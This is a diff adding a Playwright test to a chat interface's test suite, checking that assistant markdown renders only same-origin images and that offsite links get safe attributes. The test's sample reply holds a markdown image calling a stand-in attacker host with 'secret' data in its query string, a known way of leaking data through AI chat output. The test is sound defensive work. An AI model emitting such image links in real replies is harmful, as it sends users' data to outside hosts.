@@ -218,6 +218,50 @@ test.describe("Chat — streaming @medium", () => {
       frigateApp.page.getByText(/searching for people/i),
     ).toBeVisible({ timeout: 5_000 });
   });
+
+  test("assistant markdown renders only same-origin images", async ({
+    frigateApp,
+  }) => {
+    const reply =
+      "![leaked alt](https://evil.example/x.png?d=secret) " +
+      "![local](/api/events/abc/thumbnail.webp) " +
+      "[offsite](https://evil.example/page)";
+    await installChatStreamOverride(frigateApp, [
+      { type: "content", delta: reply },
+      {
+        type: "messages",
+        messages: [
+          { role: "system", content: "sys" },
+          { role: "user", content: "show me" },
+          { role: "assistant", content: reply },
+        ],
+      },
+      { type: "done" },
+    ]);
+    const offsiteRequests: string[] = [];
+    frigateApp.page.on("request", (req) => {
+      if (req.url().includes("evil.example")) offsiteRequests.push(req.url());
+    });
+    await frigateApp.goto("/chat");
+    const input = frigateApp.page.getByPlaceholder(/ask/i);
+    await expect(input).toBeVisible({ timeout: 10_000 });
+    await input.fill("show me");
+    await input.press("Enter");
+
+    await expect(frigateApp.page.getByText("leaked alt")).toBeVisible({
+      timeout: 10_000,
+    });
+    await expect(
+      frigateApp.page.locator('img[src*="evil.example"]'),
+    ).toHaveCount(0);
+    await expect(
+      frigateApp.page.locator('img[src="/api/events/abc/thumbnail.webp"]'),
+    ).toHaveCount(1);
+    const link = frigateApp.page.getByRole("link", { name: "offsite" });
+    await expect(link).toHaveAttribute("target", "_blank");
+    await expect(link).toHaveAttribute("rel", "noopener noreferrer");
+    expect(offsiteRequests).toEqual([]);
+  });
 });
 
 test.describe("Chat — stop @medium", () => {
